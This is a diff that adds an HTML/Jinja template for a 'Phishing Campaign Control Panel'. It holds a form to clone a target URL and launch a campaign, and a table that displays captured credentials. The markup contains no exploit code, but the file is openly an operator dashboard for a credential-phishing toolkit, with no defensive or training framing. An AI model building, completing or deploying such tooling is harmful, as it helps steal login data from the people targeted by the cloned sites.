@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Phishing Toolkit Dashboard</title>
+    <style>
+        body { font-family: sans-serif; margin: 2em; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }
+        tr:nth-child(even) { background-color: #f2f2f2; }
+        pre { white-space: pre-wrap; word-wrap: break-word; }
+    </style>
+</head>
+<body>
+    <h1>Phishing Campaign Control Panel</h1>
+    <form method="post">
+        <label for="url">URL to Clone:</label>
+        <input type="url" name="url" id="url" size="50" required>
+        <input type="submit" value="Launch Campaign">
+    </form>
+    <hr>
+    <h2>Captured Credentials</h2>
+    <table>
+        <tr>
+            <th>Timestamp</th>
+            <th>Data</th>
+        </tr>
+        {% for cred in creds %}
+        <tr>
+            <td>{{ cred['timestamp'] }}</td>
+            <td><pre>{{ cred['data'] }}</pre></td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
